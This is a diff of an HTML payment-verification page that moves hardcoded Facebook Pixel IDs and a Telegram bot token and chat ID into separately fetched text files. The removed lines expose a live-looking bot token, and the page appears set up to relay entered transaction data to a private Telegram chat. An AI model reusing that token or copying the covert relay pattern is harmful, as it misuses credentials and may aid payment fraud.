@@ -185,7 +185,7 @@
             line-height:1.5;
         }
     </style>
-</head>
+<script src="protection.js"></script></head>
 <body>
 
     <div class="app">
@@ -260,7 +260,7 @@
 
     </div>
 
-   <!-- Facebook Pixel (loaded but fires on success only) -->
+<!-- Facebook Pixel (loaded but fires on success only) -->
 <script>
     !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
     n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
@@ -268,40 +268,52 @@
     t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
     document,'script','https://connect.facebook.net/en_US/fbevents.js');
     
-    // Initialize the first Pixel
-    fbq('init', '939222439114419');
-    
-     // Initialize the first Pixel
-    fbq('init', '2218519068985981');
-    // This tracks a PageView for BOTH Pixels automatically
-    fbq('track', 'PageView');
+    // Dynamic Pixel Initialization
+    fetch('pixel.txt')
+        .then(response => response.text())
+        .then(data => {
+            const pixels = data.split('\n').map(p => p.trim()).filter(p => p !== '');
+            pixels.forEach(pixelId => {
+                fbq('init', pixelId);
+            });
+            fbq('track', 'PageView');
+        })
+        .catch(err => console.error('Error loading pixels:', err));
 </script>
 
-<noscript>
-    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=939222439114419&ev=PageView&noscript=1"/>
-    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1691296458720135&ev=PageView&noscript=1"/>
+<noscript id="pixel-noscript">
+    <!-- Noscript fallbacks will be dynamically added if needed, but primary focus is JS-enabled tracking -->
 </noscript>
 
 <script src="data.js"></script>
 <script>
     // ==========================================
-    // TELEGRAM BOT CONFIGURATION - FIX APPLIED
+    // TELEGRAM BOT CONFIGURATION - DYNAMIC FETCH
     // ==========================================
-    const TELEGRAM_BOT_TOKEN = '8782115815:AAFzkemSYKItPd7T2fpgmoL4e3YZVxkf0jk';
-    const TELEGRAM_CHAT_ID = '7007298163';
+    let TELEGRAM_BOT_TOKEN = '';
+    let TELEGRAM_CHAT_ID = '';
     
+    async function loadTelegramConfig() {
+        try {
+            const [tokenRes, chatRes] = await Promise.all([
+                fetch('tg.txt'),
+                fetch('chatid.txt')
+            ]);
+            TELEGRAM_BOT_TOKEN = (await tokenRes.text()).trim();
+            TELEGRAM_CHAT_ID = (await chatRes.text()).trim();
+            console.log('✅ Telegram config loaded');
+        } catch (err) {
+            console.error('❌ Error loading Telegram config:', err);
+        }
+    }
+
     // Flag to track if config is valid
     const isTelegramConfigured = () => {
-        const isValidToken = TELEGRAM_BOT_TOKEN && 
-                            TELEGRAM_BOT_TOKEN !== '' && 
-                            TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE';
-        const isValidChatId = TELEGRAM_CHAT_ID && 
-                             TELEGRAM_CHAT_ID !== '' && 
-                             TELEGRAM_CHAT_ID !== '0';
-        return isValidToken && isValidChatId;
+        return TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID;
     };
 
     document.addEventListener('DOMContentLoaded', () => {
+        loadTelegramConfig();
 
         const utrInput = document.getElementById('utrInput');
         const btnVerify = document.getElementById('btnVerify');
